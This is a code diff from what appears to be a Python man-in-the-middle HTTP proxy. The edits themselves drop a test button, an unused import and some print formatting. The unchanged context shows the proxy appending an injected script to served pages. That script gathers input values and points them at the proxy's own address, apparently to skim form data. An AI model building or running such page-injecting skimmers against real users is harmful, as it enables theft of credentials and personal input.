@@ -1,7 +1,6 @@
 from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse
 import requests
-import http.client
 
 from networking import *
 import json
@@ -34,7 +33,6 @@ def modify_headers(rsp):
 # Description: Modify the byte content
 def modify_b_content(b_content):
     server_url = f"http://{get_ip_address()}"
-    new_html = '<div><button onclick="handleClick()">Click me</button></div>'
     new_script = '''
         <script>
             // Create an object to hold the input values
@@ -62,10 +60,7 @@ def modify_b_content(b_content):
         </script>
         ''' % server_url
 
-    b_new_html = new_html.encode()
     b_new_script = new_script.encode()
-
-    b_content += b_new_html
     b_content += b_new_script
 
     return b_content
@@ -163,7 +158,7 @@ class Server:
         self.http_daemon = HTTPServer(("", port), ProxyHTTPRequestHandler)
         
         # Print serving ip address / port & update server status
-        print("Serving at", get_ip_address() + ":" + str(port) + "\n")
+        print("Serving at", get_ip_address() + ":" + str(port))
         self.is_ready_bool = True
 
         self.http_daemon.serve_forever() # Set server to handle requests indefinitely
@@ -181,4 +176,4 @@ class Server:
             self.http_daemon = None
             self.is_ready_bool = False
 
-            print("Server closed...")
+            print("\nServer closed...")
